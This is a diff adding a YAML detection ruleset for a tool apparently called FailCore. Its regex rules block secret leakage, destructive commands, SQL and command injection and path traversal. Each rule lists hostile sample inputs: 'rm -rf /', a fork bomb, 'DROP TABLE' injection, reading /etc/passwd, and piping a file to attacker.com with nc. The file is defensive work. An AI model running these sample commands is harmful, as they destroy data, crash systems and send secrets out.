@@ -1,0 +1,148 @@
+# failcore/config/rulesets/default/semantic.yml
+# Semantic Intent Rules
+
+name: semantic
+version: "1.0.0"
+description: "Default semantic rules for detecting malicious intent"
+
+metadata:
+  maintainer: "FailCore Team"
+  last_updated: "2026-01-14"
+
+rules:
+  # Secret Leakage
+  - rule_id: "SEM-001"
+    name: "Echo Environment Variable"
+    category: "semantic.secret_leakage"
+    severity: "high"
+    description: "Detects attempts to echo environment variables (potential secret leakage)"
+    action: "block"
+    patterns:
+      - pattern_type: "regex"
+        value: "echo\\s+\\$[A-Z_]+"
+        flags: "i"
+    examples:
+      - command: "echo $API_KEY"
+      - command: "echo $AWS_SECRET_ACCESS_KEY"
+    false_positive_rate: 0.01
+  
+  - rule_id: "SEM-002"
+    name: "Print Environment Variable"
+    category: "semantic.secret_leakage"
+    severity: "high"
+    description: "Detects attempts to print environment variables"
+    action: "block"
+    patterns:
+      - pattern_type: "regex"
+        value: "print\\s*\\(\\s*os\\.environ\\[|print\\s*\\(\\s*os\\.getenv\\("
+        flags: "i"
+    examples:
+      - code: "print(os.environ['API_KEY'])"
+    false_positive_rate: 0.01
+  
+  # Dangerous Commands
+  - rule_id: "SEM-101"
+    name: "Recursive Delete Root"
+    category: "semantic.dangerous_combo"
+    severity: "critical"
+    description: "Detects dangerous recursive delete on root directories"
+    action: "block"
+    patterns:
+      - pattern_type: "regex"
+        value: "rm\\s+-rf?\\s+/"
+        flags: ""
+    examples:
+      - command: "rm -rf /"
+      - command: "rm -r /"
+    false_positive_rate: 0.0
+  
+  - rule_id: "SEM-102"
+    name: "Fork Bomb Pattern"
+    category: "semantic.dangerous_combo"
+    severity: "critical"
+    description: "Detects fork bomb patterns"
+    action: "block"
+    patterns:
+      - pattern_type: "regex"
+        value: ":\\(\\)\\s*\\{\\s*:|:\\(\\)\\{|\\(\\)\\s*\\{\\s*\\(\\)"
+        flags: ""
+    examples:
+      - command: ":(){ :|:& };:"
+    false_positive_rate: 0.0
+  
+  # Injection Attacks
+  - rule_id: "SEM-201"
+    name: "SQL Injection - UNION SELECT"
+    category: "semantic.injection"
+    severity: "high"
+    description: "Detects SQL injection with UNION SELECT"
+    action: "block"
+    patterns:
+      - pattern_type: "regex"
+        value: "UNION\\s+SELECT"
+        flags: "i"
+    examples:
+      - query: "SELECT * FROM users WHERE id = 1 UNION SELECT password FROM admin"
+    false_positive_rate: 0.02
+  
+  - rule_id: "SEM-202"
+    name: "SQL Injection - DROP TABLE"
+    category: "semantic.injection"
+    severity: "critical"
+    description: "Detects SQL injection with DROP TABLE"
+    action: "block"
+    patterns:
+      - pattern_type: "regex"
+        value: "DROP\\s+TABLE"
+        flags: "i"
+    examples:
+      - query: "'; DROP TABLE users; --"
+    false_positive_rate: 0.0
+  
+  - rule_id: "SEM-203"
+    name: "Command Injection - Pipe"
+    category: "semantic.injection"
+    severity: "high"
+    description: "Detects command injection with pipe operator"
+    action: "block"
+    patterns:
+      - pattern_type: "regex"
+        value: ";\\s*\\w+|\\|\\s*\\w+"
+        flags: ""
+    config:
+      requires_parser: true
+    examples:
+      - command: "ls; cat /etc/passwd"
+      - command: "cat file | nc attacker.com 1234"
+    false_positive_rate: 0.05
+  
+  # Path Traversal
+  - rule_id: "SEM-301"
+    name: "Path Traversal - Parent Directory"
+    category: "semantic.path_traversal"
+    severity: "high"
+    description: "Detects path traversal attempts with ../"
+    action: "block"
+    patterns:
+      - pattern_type: "regex"
+        value: "\\.\\./|\\.\\.\\\\""
+        flags: ""
+    examples:
+      - path: "../../etc/passwd"
+      - path: "..\\..\\windows\\system32"
+    false_positive_rate: 0.01
+  
+  - rule_id: "SEM-302"
+    name: "Path Traversal - Absolute Path"
+    category: "semantic.path_traversal"
+    severity: "medium"
+    description: "Detects absolute paths to sensitive directories"
+    action: "warn"
+    patterns:
+      - pattern_type: "regex"
+        value: "^/etc/|^/root/|^/sys/|^C:\\\\Windows\\\\|^C:\\\\Users\\\\"
+        flags: "i"
+    examples:
+      - path: "/etc/passwd"
+      - path: "C:\\Windows\\System32"
+    false_positive_rate: 0.1
